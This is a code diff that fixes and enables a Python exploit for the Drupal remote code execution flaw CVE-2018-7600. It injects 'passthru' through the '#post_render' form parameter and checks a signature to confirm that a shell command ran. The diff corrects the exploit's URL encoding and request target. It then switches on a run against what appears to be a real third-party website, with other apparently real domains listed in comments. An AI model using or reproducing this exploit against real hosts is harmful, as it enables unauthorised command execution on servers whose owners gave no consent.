@@ -98,7 +98,7 @@ def exploitD7Clean(host):
     url = host + 'user/password'
     get_params = {'name[#post_render][]': 'passthru',
                     'name[#type]': 'markup',
-                    'name[#markup]': ' echo ' + signature}
+                    'name[#markup]': 'echo ' + signature}
     post_params = {'form_id': 'user_pass',
                     '_triggering_element_name': 'name'}
     try:
@@ -111,12 +111,15 @@ def exploitD7Clean(host):
                     ' value="([^"]+)"', r.text)
     if m:
         found = m.group(1)
-        url = ''.join([host, 'file/ajax/name/#value/', found])
+        url = ''.join([host, 'file/ajax/name/%23value/', found])
         post_params = {'form_build_id': found}
-        res = requests.post(host, data=post_params)
+        # post url, not host
+        res = requests.post(url, data=post_params)
         detect = bool(re.search(signature, res.text))
         if detect:
             return True
+        else:
+            return False
     else:
         return False
 
@@ -139,7 +142,6 @@ def exploitD8(host):
         return False
 
 def isPwnAbleClean(host, version):
-    signature = ulti.genSignature()
     if version == '7':
         return exploitD7Clean(host)
 
@@ -176,15 +178,16 @@ def check_CVE_7600(host, version):
     return res
 
 
-# host = 'http://doyogawithme.com/'
+host = 'http://lythuyetlaixe.com/'
+# host = 'http://192.168.210.133'
 # # # host = 'https://whatchareadin.de'
 # # # host = 'http://autoshares.com/'
-# version = '7.44'
-# # version = '8.2'
+version = '7.44'
+# version = '8.2'
 # # # ver = '8.2'
 # # print 'Testing: ', host
 # # print '=' * 25
-# print isVuln(host,version)
+print isVuln(host,version)
 # # formStatus = isFormValid(host,version)
 # # if('Redirected' in formStatus):
 # #     print 'Redirected'
